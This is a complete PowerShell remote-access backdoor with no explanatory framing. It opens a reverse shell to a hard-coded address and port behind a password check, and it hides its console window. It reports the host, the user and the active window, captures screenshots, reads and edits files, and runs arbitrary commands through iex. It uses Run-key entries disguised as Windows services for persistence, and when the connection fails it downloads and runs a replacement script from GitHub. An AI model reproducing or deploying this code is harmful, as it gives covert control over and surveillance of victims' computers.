# --- CONFIG ---
$ip   = '172.16.176.40'
$port = 4444
$pass = 'biskviti'
$user = "B15cu1t"
$reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Function to grab the Foreground Window Title
function Get-ActiveWin {
    $code = '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);'
    $type = Add-Type -MemberDefinition $code -Name "WinUtils" -Namespace "Util" -PassThru
    $handle = $type::GetForegroundWindow()
    $builder = New-Object System.Text.StringBuilder 256
    $type::GetWindowText($handle, $builder, 256) | Out-Null
    return $builder.ToString()
}

try {
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true

    $w.WriteLine("AUTH:")
    if ($r.ReadLine() -eq $pass) {
        
        # HIDE WINDOW
        try {
            $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
            $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
            $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
        } catch {}

        # --- INITIAL HANDSHAKE ---
        $who = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        $win = Get-ActiveWin
        $w.WriteLine("`n" + ("="*30))
        $w.WriteLine("  HOST: $env:COMPUTERNAME")
        $w.WriteLine("  USER: $who")
        $w.WriteLine("  TASK: $win")
        $w.WriteLine(("="*30) + "`n")

        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $raw = $r.ReadLine(); if ($null -eq $raw) { break }
            $cmd = $raw.Trim()

            if ($cmd -eq "exit") { break }
            
            # Window title
            elseif ($cmd -eq "window") {
                $w.WriteLine("[ACTIVE]: " + (Get-ActiveWin))
            }

            # Screenshot
            elseif ($cmd -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            }

            # FILE OPERATIONS
            elseif ($cmd -eq "touch") {
                $filename = $r.ReadLine().Trim()
                New-Item -ItemType File -Path $filename -Force | Out-Null
                $w.WriteLine("[+] Created: $filename")
            }
            
            elseif ($cmd -eq "nano" -or $cmd -eq "edit") {
                $filename = $r.ReadLine().Trim()
                if (Test-Path $filename) {
                    $content = Get-Content $filename -Raw -Encoding UTF8
                } else {
                    $content = ""
                    New-Item -ItemType File -Path $filename -Force | Out-Null
                }
                $w.WriteLine("=== $filename ===")
                $w.WriteLine($content)
                $w.WriteLine("--- Send new content ('.' on blank line to save) ---")
                
                $newContent = @()
                while($true) {
                    $line = $r.ReadLine()
                    if ($line.Trim() -eq ".") { break }
                    $newContent += $line
                }
                
                $newContent -join "`r`n" | Set-Content $filename -Encoding UTF8
                $w.WriteLine("[+] Saved: $filename")
            }
            
            elseif ($cmd -match "^append\s+(.*)") {
                $filename = $matches[1]
                $w.WriteLine("[APPEND] Enter content for $filename ('.' to finish):")
                $content = @()
                while($true) {
                    $line = $r.ReadLine()
                    if ($line.Trim() -eq ".") { break }
                    $content += $line
                }
                $content -join "`r`n" | Add-Content $filename -Encoding UTF8
                $w.WriteLine("[+] Appended to: $filename")
            }
            
            elseif ($cmd -match "^cat\s+(.*)") {
                $filename = $matches[1]
                if (Test-Path $filename) {
                    Get-Content $filename -Encoding UTF8 | % { $w.WriteLine($_) }
                } else {
                    $w.WriteLine("[-] File not found: $filename")
                }
            }

            # Cleanup
            elseif ($cmd -eq "kill") {
                "WinDiag","WinUpdate","WinLog","WinService" | ForEach-Object {
                    $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
                    if ($item.$_ -like "*$user*") { Remove-ItemProperty -Path $reg -Name $_ }
                }
                $w.WriteLine("[!] Cleanup Complete."); $c.Close(); Stop-Process -Id $PID -Force 
            }
            
            # TIMEOUT EXECUTION (for everything else)
            else { 
                $job = Start-Job -ScriptBlock { 
                    param($cmd) 
                    try { 
                        $result = iex $cmd 2>&1 | Out-String 
                        if ([string]::IsNullOrEmpty($result.Trim())) { "[-] No output" } 
                        else { $result } 
                    } catch { 
                        "ERROR: $_" 
                    } 
                } -ArgumentList $cmd
                
                if (Wait-Job $job -Timeout 10) {
                    Receive-Job $job | % { $w.WriteLine($_) }
                } else {
                    Stop-Job $job -Force; Remove-Job $job -Force
                    $w.WriteLine("[!] TIMEOUT: Command took >10s")
                }
            }
        }
    } else {
        "WinDiag","WinUpdate","WinLog","WinService" | % { Remove-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue }
        exit
    }
    $c.Close()
} catch {
    Start-Sleep -s 120
    iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v2.ps1")
}
